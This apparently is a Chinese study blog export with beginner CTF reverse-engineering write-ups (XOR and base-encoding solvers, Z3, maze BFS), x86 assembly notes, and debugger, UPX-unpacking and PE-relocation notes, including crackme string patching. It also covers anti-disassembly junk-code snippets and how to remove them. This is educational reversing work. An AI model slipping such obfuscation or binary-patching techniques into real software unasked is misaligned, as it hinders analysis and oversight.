[201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] flag = [] random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) print(l) for i in range(len(l)): random.seed(l[i]) for n in range(5): ​ flag.append((chr((result[i*5+n])^random.getrandbits(8)))) flag = \u0026#39;\u0026#39;.join(flag) print(flag) 卡在签到题了\u0026hellip; if ( Str2[j] == 111 ) Str2[j] = 48; 看到有个很像flag的{hello_world},提交结果发现错了，一看伪代码，发现把0改成了o，ASCII表o对应111，0对应48\n花指令 jump\n1 2 3 4 5 6 7 8 9 10 start://花指令开始 jmp label1 DB junkcode label1: jmp label2 DB junkcode label2： jmp label3 DB junkcode label3 jnz和jz跳转\n1 2 3 4 5 6 _asm{ jz label1 jnz label1 db junkcode label1: } 永真条件跳转 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __asm{ push ebx xor ebx,ebx test ebx,ebx jnz label1 jz label2 label1: _emit junkcode label2: pop ebx//需要恢复ebx寄存器 } __asm{ clc jnz label1: _emit junkcode label1: } call\u0026amp;ret构造花指令 1 2 3 4 5 6 7 8 9 10 11 __asm{ call label1 _emit junkcode label1: add dword ptr ss:[esp],8//具体增加多少根据调试来 ret _emit junkcode } call指令：将下一条指令地址压入栈，再跳转执行 ret指令：将保存的地址取出，跳转执行 例题\n按D转换成数据形式\n右键change bytes E8换成90 就是nop\n后面变黄的地址c修复即可\n转到函数开头p生成函数\n[HUBUCTF 2022 新生赛]ezPython 拿到题目，发现文件时.pyz结尾，先转换成py格式\nuncompyle 6 -o ezPython.py ezPython.pyz\n1 2 3 4 5 6 7 8 9 10 from Crypto.Util.number import * import base64, base58 password = open(\u0026#34;password.txt\u0026#34;, \u0026#34;r\u0026#34;).read() tmp = bytes_to_long(password.encode(\u0026#34;utf-8\u0026#34;)) ans = base64.b64encode(base58.b58encode(str(tmp))).decode() print(\u0026#34;I\u0026#39;ve forgot my password,could you please help me find the password?\u0026#34;) if ans == \u0026#34;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==\u0026#34;: print(\u0026#34;You get the password!\u0026#34;) else: print(\u0026#34;Wrong! try again\u0026#34;) 解释下，bytes_to_long()把字节转换成长整型，加密成utf-8形式，再转为字符串，转为base58，转为base64，逆过来写就行\n1 2 3 4 5 6 7 8 9 10 11 12 from Crypto.Util.number import * import base64 import base58 import hashlib flag1=\u0026#34;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==\u0026#34; flag= int(base58.b58decode(base64.b64decode(flag1))) print(flag) flag = long_to_bytes(flag) flag.decode(\u0026#34;utf-8\u0026#34;) flag = hashlib.md5(flag).hexdigest() print(flag) 一些习惯：打开IDAshift f12查看字符串\nctrl+x 交叉引用\nZ3-slover Solver()\n创建一个求解器，在里面添加约束条件进行下一步的求解\nadd()\n通常在solver()命令之后，用来添加约束条件，通常添加的约束条件是一个等式\ncheck()\n判断是否添加的约束条件是否有解，有解返回sat，无解返回unsat\nmodel()\n在有解的情况下，求解的交集再输出创建求解约束器\n1 solver = Solver 添加约束条件\n1 solver.add() 判断解是否存在\n1 if solver.check()==sat 求解\n1 print solver.model() 题目\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; using namespace std; void flag_checker(int v, int w,int x,int y,int z); int main(){ int v,w,x,y,z; cout \u0026lt;\u0026lt; \u0026#34;Input 5 random number and check your luck ;)\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Num1: \u0026#34;; cin \u0026gt;\u0026gt; v; cout \u0026lt;\u0026lt; \u0026#34;Num2: \u0026#34;; cin \u0026gt;\u0026gt; w; cout \u0026lt;\u0026lt; \u0026#34;Num3: \u0026#34;; cin \u0026gt;\u0026gt; x; cout \u0026lt;\u0026lt; \u0026#34;Num4: \u0026#34;; cin \u0026gt;\u0026gt; y; cout \u0026lt;\u0026lt; \u0026#34;Num5: \u0026#34;; cin \u0026gt;\u0026gt; z; cout \u0026lt;\u0026lt; endl; flag_checker(v,w,x,y,z); } void flag_checker(int v,int w, int x, int y, int z){ if ((v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322) \u0026amp;\u0026amp; (v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724) \u0026amp;\u0026amp; (v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529) \u0026amp;\u0026amp; (v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457) \u0026amp;\u0026amp; (v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367)){ cout \u0026lt;\u0026lt; \u0026#34;Congratulations, Here is your flag:\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;flag{\u0026#34; \u0026lt;\u0026lt; v \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; w \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; y \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; z \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl; } else{ cout \u0026lt;\u0026lt; \u0026#34;\\nSeems your luck is not in favor right now!\\nBetter luck next time!\u0026#34; \u0026lt;\u0026lt; endl; } } 1 2 3 4 5 6 7 8 9 10 from z3 import * s=Solver() v,w,x,y,z=Ints(\u0026#39;v w x y z\u0026#39;) #定义整数变量 s.add(v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322) s.add(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724) s.add(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529) s.add(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457) s.add(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367) s.check() print(s.model()) [SWPUCTF 2022 新生赛]xor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char str[] = \u0026#34;LQQAVDyZMP]3q]emmf]uc{]vm]glap{rv]dnce\u0026#34;; char flag[39]; for (int i = 0; i \u0026lt;= 38; i++) { ​ flag[i] = str[i] ^ 2; } printf(\u0026#34;%s\u0026#34;, flag); } easyasm cmp [ebp+i], eax\njge short loc_40119D （大于等于）\n最主要是这两行，以及[ebp+i]一开始赋值为0\neax没有初始化，我想第一次循环是不会直接跳，所以继续执行后面的内容，看到xor eax, 33h，知道和55作异或运算，逆过来就是把明文每个作XOR运算\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ; void __cdecl enc(char *p) .text:00401160 _enc proc near ; CODE XREF: _main+1B↑p .text:00401160 .text:00401160 i = dword ptr -4 .text:00401160 Str = dword ptr 8 .text:00401160 .text:00401160 push ebb .text:00401161 mov ebp, esp .text:00401163 push ecx .text:00401164 mov [ebp+i], 0 .text:0040116B jmp short loc_401176 .text:0040116D ; --------------------------------------------------------------------------- .text:0040116D .text:0040116D loc_40116D: ; CODE XREF: _enc+3B↓j .text:0040116D mov eax, [ebp+i] .text:00401170 add eax, 1 .text:00401173 mov [ebp+i], eax .text:00401176 .text:00401176 loc_401176: ; CODE XREF: _enc+B↑j .text:00401176 mov ecx, [ebp+Str] .text:00401179 push ecx ; Str .text:0040117A call _strlen .text:0040117F add esp, 4 .text:00401182 cmp [ebp+i], eax .text:00401185 jge short loc_40119D .text:00401187 mov edx, [ebp+Str] .text:0040118A add edx, [ebp+i] .text:0040118D movsx eax, byte ptr [edx] .text:00401190 xor eax, 33h .text:00401193 mov ecx, [ebp+Str] .text:00401196 add ecx, [ebp+i] .text:00401199 mov [ecx], al .text:0040119B jmp short loc_40116D .text:0040119D ; --------------------------------------------------------------------------- .text:0040119D .text:0040119D loc_40119D: ; CODE XREF: _enc+25↑j .text:0040119D mov esp, ebp .text:0040119F pop ebp .text:004011A0 retn .text:004011A0 _enc endp Input: your flag Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char flag1[] = {0x5b, 0x54, 0x52, 0x5e, 0x56, 0x48, 0x44, 0x56, 0x5f, 0x50, 0x3, 0x5e, 0x56, 0x6c, 0x47, 0x3, 0x6c, 0x41, 0x56, 0x6c, 0x44, 0x5c, 0x41, 0x2, 0x57, 0x12, 0x4e}; char flag[100] = {0}; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag[i] = flag1[i] ^ 51; } printf(\u0026#34;%s\\n\u0026#34;, flag); } 你知道什么事python吗 1 2 3 4 5 6 7 8 9 10 11 12 13 14 s = str(input(\u0026#34;please input your flag:\u0026#34;)) arr=[29, 0, 16, 23, 18, 61, 43, 41, 13, 28, 88, 94, 49, 110, 66, 44, 43, 28, 91, 108, 61, 7, 22, 7, 43, 51, 44, 46, 9, 18, 20, 6, 2, 24] if(len(s)!=35 or s[0]!=\u0026#39;N\u0026#39;): print(\u0026#34;error\u0026#34;) exit(0) for i in range(1,len(s)): if(ord(s[i-1])^ord(s[i])!=arr[i-1]): print(\u0026#34;error!\u0026#34;) exit(0) print(\u0026#34;right!\u0026#34;) 1 2 3 4 5 6 arr=[29, 0, 16, 23, 18, 61, 43, 41, 13, 28, 88, 94, 49, 110, 66, 44, 43, 28, 91, 108, 61, 7, 22, 7, 43, 51, 44, 46, 9, 18, 20, 6, 2, 24] s = [\u0026#39;\u0026#39;] * 35 s[0]=\u0026#39;N\u0026#39; for i in range(1,len(arr)+1): s[i]=chr(ord(s[i-1])^arr[i-1]) print(\u0026#34;\u0026#34;.join(s)) s=[\u0026rsquo;\u0026rsquo;]*35 分配初始空间\nord()转换成ascii码\nchr()转换成字符\nprint(\u0026quot;\u0026quot;.join(s))拼接\n安卓逆向 java -jar jadx-1.5.1-all.jar\n文件拖进来\n搜索字符串‘NO’\n1 2 3 4 5 6 7 8 9 10 11 12 13 text = \u0026#39;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌\u0026#39; key = 987654321 flag = \u0026#39;\u0026#39; for i in text: \\# 将结果限制在有效的 Unicode 范围内，限制在0-255范围内 flag += chr((ord(i) ^ key) % 256) print(flag) 注意限制字符长度！\nchicken_soup 花指令 E8改成90 p生成函数\n%c直接转为ASCII码，c语言这点比python好\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { unsigned char a1[] = {0xCD, 0x4D, 0x8C, 0x7D, 0xAD, 0x1E, 0xBE, 0x4A, 0x8A, 0x7D, 0xBC, 0x7C, 0xFC, 0x2E, 0x2A, 0x79, 0x9D, 0x6A, 0x1A, 0xCC, 0x3D, 0x4A, 0xF8, 0x3C, 0x79, 0x69, 0x39, 0xD9, 0xDD, 0x9D, 0xA9, 0x69, 0x4C, 0x8C, 0xDD, 0x59, 0xE9, 0xD7}; for (int i = 0; i \u0026lt; 38; i++) { a1[i] = (16 * a1[i]) | (a1[i] \u0026gt;\u0026gt; 4); } for (int j = 36; j \u0026gt; 0; j--) { a1[j] -= a1[j + 1]; } for (int i = 0; i \u0026lt; 38; i++) { printf(\u0026#34;%c\u0026#34;, a1[i]); } return 0; } 关了IDA忘记截图，索性拿别人wp\n老鼠走迷宫 难崩，Windows环境有点难配\nconda activate 2-27进入python3.6版本的conda环境，进入D盘目录pyinstxtractor\npython pyinstxtractor.py 附件.exe\n用struct.pyc修复5.pyc头文件\n进入D盘pydcd的build\npycdc.exe 5.pyc\n脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 from collections import deque #设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可 (row, col) = (12, 12) (i, j) = (0, 0) maze = [ [ 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1], [ 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]] path_len = 0x7fffffff#如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度，否则请保留path_len的极大值 #进行BFS寻找路径 def bfs(start, end, barrier): directions = [(0, 1), (1, 0), (0, -1), (-1, 0)] # 定义四个方向的移动 for i in range(len(maze)):#获取起点和终点在列表中的索引 for j in range(len(maze[i])): if(maze[i][j] == start): start = (i, j) if(maze[i][j] == end): end = (i, j) #以下均是bfs算法套路 queue = deque() queue.append((start, [start])) # (当前位置, 路径) visited = set() visited.add(start) while queue: position, path = queue.popleft() if position == end: return path elif len(path)==path_len: return path for d in directions: next_position = (position[0] + d[0], position[1] + d[1]) if 0 \u0026lt;= next_position[0] \u0026lt; len(maze) and 0 \u0026lt;= next_position[1] \u0026lt; len(maze[0]) and \\ maze[next_position[0]][next_position[1]] != barrier and next_position not in visited: queue.append((next_position, path + [next_position])) visited.add(next_position) return None #执行BFS搜索并打印结果 if __name__ == \u0026#39;__main__\u0026#39;: maze[0][1] = \u0026#39;S\u0026#39; #如果题目给了起点终点的坐标，在这里直接给起点和终点添加特征 maze[24][23] = \u0026#39;E\u0026#39; path = bfs(\u0026#39;S\u0026#39;, \u0026#39;E\u0026#39;, 1) #bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如\u0026#39;#\u0026#39;) print(\u0026#34;移动路径坐标：\u0026#34;, path) print(\u0026#34;移动路径方位：{\u0026#34;, end=\u0026#39;\u0026#39;) for i in range(1 ,len(path)): x1, y1, x2, y2 = path[i - 1][0], path[i - 1][1], path[i][0], path[i][1] if(x1 \u0026gt; x2):#上 print(\u0026#34;w\u0026#34;, end=\u0026#39;\u0026#39;) elif(x1 \u0026lt; x2):#下 print(\u0026#34;s\u0026#34;, end=\u0026#39;\u0026#39;) elif(y1 \u0026gt; y2):#左 print(\u0026#34;a\u0026#34;, end=\u0026#39;\u0026#39;) elif(y1 \u0026lt; y2):#右 print(\u0026#34;d\u0026#34;, end=\u0026#39;\u0026#39;) print(\u0026#39;}\u0026#39;) 随后md5加密\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nssctf%E9%80%86%E5%90%91%E9%A2%98/","title":"nssctf逆向题"},{"content":"编辑：vim/edit\n编译：masm\n链接：link\n将内存2000:0，2000:1,2000:2,2000:3单元中的数据送入al,bl,cl,dl中\n1 2 3 4 5 6 7 mov ax,2000 mov ds,ax;段地址2000h送入ds mov bx,0;偏移地址0送入bx mov al,[bx];ds:bx单元中的数据送入al 1 2 3 4 5 mov ax,2000 mov ds,ax;段地址2000h送入ds mov al,ds:[0] 比较 1 2 3 4 5 6 7 mov al,[0];将常量0送入al中 mov al,ds:[0];(al)=((ds)*16+0) mov al,ds:[bx];(al)=((ds)*16+(bx)) mov al,ds:[bx];与上面相同 循环 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 assume cs:code code segment ​ mov ax,0ffffh ​ mov ds,ax;初始化ds:bx指向ffff:0 ​ mov bx,0;初始化累加寄存器dx,(dx)=0 ​ mov cx,12;初始化循环计数寄存器 s: mov al,[bx] ​ mov ah,0 ​ add dx,ax;间接向dx中加上((ds)*16+(bx))的数值 ​ inc bx ​ loop s ​ mov ax,4c00h ​ int 21h code ends end 复制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 assume cs:code code segment ​ mov bx,0；偏移位置从0开始 ​ mov cx,12；循环12次 s: mov ax,0fffh ​ mov ds,ax；(ds)=0ffffh ​ mov dl,[bx]；(dl)=((ds)*16+(bx))，将ffff:bx中的数据送入dl ​ mov ax,0020h ​ mov ds,ax；（ds)=0020h ​ mov [bx],dl；（(ds)*16+bx）=(dl),将dl的数据送入0020:bx ​ inc bx；偏移位置加1 ​ loop s ​ mov ax,4c00h ​ int 21h code ends end 代码段中使用栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 assume cs:codesg codesg segment ​ dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ​ dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间，存放16个数据，在后面的程序中将这段空间当作栈来使用 start: mov ax,cs ​ mov ss,ax ​ mov sp,30h ​ mov bx,0 ​ mov cx,8 ​ s:push cs:[bx] ​ add bx,2 ​ loop s;将代码0-15单元中的8个字型数据依次入栈 ​ mov bx,0 ​ mov cx,8 ​ s0:pop cs:[bx] ​ add bx,2 ​ loop s0;出栈8个字型数据到代码段0-15单元 ​ mov ax,4c00h ​ int 21h codesg ends end start;指明程序的入口在start处 初始状态下栈为空，所以ss:sp要指向栈底\n将数据，代码，栈放入不同的段\nQA：CPU如何知道stack放栈，data放数据？ mov ax,stack\nmov ss,ax\nmov sp,20h\n设置ss指向stack，设置ss:sp指向stack:20\n大小写转换问题 思路：大写ASCII码的第5位为0，小写字母的第5位为1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 assume cs:codesg,ds:datasg datasg segment db \u0026#39;Basic\u0026#39; db \u0026#39;iNfOrMaTiOn\u0026#39; datasg ends codesg segment start:mov ax,datasg mov ds,ax;设置ds指向daatsg mov bx,0;设置（bx）=0，ds:bx指向‘Basic’的第一个字母 mov cx,5;设置循环次数5，因为‘Basic’有5个字母 s:mov al,[bx];将ASCII码从ds:bx所指向的单元中取出 and al,11011111B;将al中的ASCII码的第5位置为0，变为大写字母 mov [bx],al;将转变后的ASCII码写回原单元 inc bx loop s mov bx,5 mov cx,11 s0:mov al,[bx] or al,00100000B;将第5位置变为1 mov [bx],al inc bx loop s0 mov ax,4c00h int 21h codesg ends end start [bx]一个内存单元\n[bx+idata]表示一个内存单元\n下面三个指令相同\nmov ax,[bx+200] mov ax,200[bx] mov ax,[bx],200 下面两个指令相同\nmov ax,[bx+si] mov ax,[bx] [si] (ax)=((ds)*16+(bx)+(si))\nidata是常量，bx,si是变量\nreg表示一个寄存器，sreg表示一个段寄存器\n关注机器指令处理的数据在什么地方\nmov bx,[0]；内存，ds:0单元\nmov bx,ax；CPU内部，ax寄存器\nmov bx,1；CPU内部，指令缓存器\n段地址（SA）和偏移地址（EA） mov ax,ds:[bp] (ax)=(ds)*16+(bp)\nSA=(ds)，EA=(bp)\nX ptr指明内存单元的长度，X再汇编指令中可以为word或byte\n例如mov word ptr ds:[0],1 指明了指令访问的内存单元是一个字单元\ndb字节型 dw字型 dd双字型数据\n如dd 100\ndup重复\ndw （重复次数） dump （数据）\n如db 3 dup (0) ,即db 0,0,0\ndb 3 dup(0,1,2),即db 0,1,2,0,1,2,0,1,2\n转移指令的原理 1 2 3 4 5 6 7 8 9 start:mov ax,0 mov bx,0 jmp short s add ax,1 s:inc REVIEW:1.从CS：IP指向内存单元读取指令，读取的指令进入指令缓冲器；2.(IP)=(IP)+所读取指令长度，从而指向下一条指令；3.执行指令，转到1，重复过程\nCS= ,IP= CS:IP指向EB 03（jump short s的机器码) 读取指令码EB 03进入指令缓冲器 IP=IP+所读取指令长度（2），指向add ax,1 CPU执行指令缓冲器中的指令EB 03（重点，如果EB 03没有对IP修改的话，应该执行add ax，1） 执行后，IP=000BH，CS:IP指向inc ax jmp word ptr 内存单元地址（段内转移）\njmp dword ptr 内存单元地址（段间转移）\njcxz相当于if((cx)==0)jump short 标号；\nloop相当于（cx)\u0026ndash;;if((cx)!=0)jump short 标号；\njump short s的转移范围是-128~127\noffset\nCPU执行ret指令，修改IP，pop IP\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\nCPU执行retf指令,修改CS和IP,POP IP,POP CS\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\nCPU执行call指令，将CS和IP压入栈，转移,pump IP ;jmp near ptr标号\n(sp)-=2\n((ss)*16+(sp))=(IP)\nIP+=16位位移\ncall far ptr 相当于push CS; push IP; jmp far ptr\nmov ax,6;call ax将6存入ax，调用地址6处的函数\nmul做乘法，要么都是16位要么都是8位\nmul byte ptr ds:[0]\n(ax)=(al)*((ds)*16+0)\nZF标志：零标志位。结果为0，ZF=1（逻辑为真）,结果为1，ZF=0\nPF标志:奇偶标志位，bit位个数是否为偶数\nSF标志：符号标志位，非负，sf=1\nCF标志：进位标志符，\ncmp ax，bx即比较ax-bx\nje等于则转移\njne\njb低于则转移below\njnb不低于则转移\nja高于则转移above\njna不高于则转移\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","title":"汇编语言"},{"content":"入口E8 00 CALL ~ Add ~\nF7 步入\nF8 步出\nctrl+F9 execute till return 跳出函数\nctrl+G 移动到指定位置\nctrl+F2 重新调试\nF9 运行至断点处\nAlt + B 打开Breakpoints，列出断点\n；添加注释\nalt+M 内存模块\nctrl+E打开编辑窗口\n运行直接到断点处，步进步出逐行进行\n快速查找指定代码 从入口处不断F8直到某个函数被执行，弹窗 查找字符串检索（有个思路，可以再IDA中看函数模块的地址，再在xdbg中ctrl+G跳转到地址） 查找调用模块 在main()处打断点，记作返回点\n修改字符串\n跳转至字符串溢出区buffer（就是地址，可以用IDA先找一下），ctrl+E打开编辑窗 缺点：新字符串不能比原字符串长\n方法二： 把字符串存到缓冲区，修改PUSH处指令ctrl+E\n在原字符汇编指令处，空格键打开assemble窗口，改成”PUSH 504FF0“\n栈顶指针ESP：向栈压入数据，栈顶指针减小，向低地址移动，从栈中弹出数据时，栈顶指针增加（理解成一个无盖容器底部装了一弹簧）\n一些对于栈FILO（file in last out）的理解 在调试时，从一个函数入口处开始ESP地址减少，说明函数调用参数，把数据压入栈\ncrakeme2 F9运行后，首先调用的就是主函数\n401248处的push401E14命令来把401E14压入栈，然后40123D处CALL\u0026lt;\u0026gt;调用401232处的JMP ThunRTMain函数，会跳转到主函数ThunRTMain，前面的401E14的值作为ThunRTMain()的参数，这是一个间接调用，利用错误消息框和字符串，字符查找，往上找条件分支\n调用403329处的函数，比较函数值，再决定跳转\n栈帧 1 2 3 4 5 6 7 8 9 10 11 PUSH EBP ;函数开始 MOV EBP,ESP;保存当前ESP到EBP中 ....... ;无论ESP值如何变，EBP都保持不变 MOV ESP,EBP;将函数的起始地址返回到ESP中 POP EBP ;函数返回前弹出保存在栈中的EBP值 RETN ;函数终止 函数返回前要先从栈中删除与其对应的栈帧\n按照传递给rctMsgBox()参数的大小14清理栈\nRETN XX:根据传参的大小调整栈\nPE头 DOS头：typedef struct_IMAGE_DOS_HEADER,e_magic:DOS签名,e_ifanew:NT头偏移\nNT头：IMAGE_NT_HEADERS\nUPX upx -o 目标文件 源文件\n可以看到文件大小由67584变为48640，比ZIP压缩后大，是因为压缩后得到PE文件，需要添加PE头，并且还要放入解压缩代码\n调试notepad程序 先找到EP代码（偶然发现一个好办法，只要在开头ctrl+F8，结束后xdbg会自动暂停到入口点）EP开始时0101开头，前面都是0701开头\n在EP处ctrl+F8开始代码追踪，发现有一个短循环，在循环末尾设置断点，F9跳出循环\nUPX特征之一是,EP代码被包含在PUSHAD/POPAD指令之间，跳转到OEP代码的JMP指令紧接着出现在POPAD之后，只要在JMP指令处设置好断点，运行后就能直接找到OEP\nPE重定向原理 PE重定向就是PE文件无法加载到ImageBase所指位置，而是被加载到其他地址时发生的一系列的处理行为\n基本原理：在应用程序中查找硬编码的地址位置，读取值后，减去ImageBase(VA-RVA),加上实际加载地址（RVA-VA)\n先查找IMAGE_BASE_RELOCATION\n1 2 3 4 5 6 7 typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; // 重定位页的 RVA DWORD SizeOfBlock; // 重定位块的大小 WORD TypeOffset; // 重定位条目的类型于偏移 } _IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; irtualAddress 重定位页 RVA。以映像装载基址加上页 RVA 的和作为被加数，再加上重定位项对应的 offset 就能得到其在内存中实际的 VA。最后一个重定位块的尾部也会添加一个 virtualaddress 字段作为结束标志。\nSizeOfBlock 基址重定位块的大小。包括 VirtualAddress，SizeOfBlock，以及后面 TypeOffset 的大小。\nTypeOffset 一个数组。数组中每个元素大小为 2 个字节，即 16 位。\ntype 高 4 位用于表示重定位的类型。\noffset 低 12 位用于表示重定位数据位置相对于页 RVA 的偏移量。与 VirtualAddress 相加就是要修改的重定位数据的指针，再加上映像装载基址就是修改后的指针。\n硬编码地址偏移：VirtualSize+Offset=1420(RVA)\n减去ImageBase值\n加上实际加载地址值\n从可执行文件中删除.reloc节区 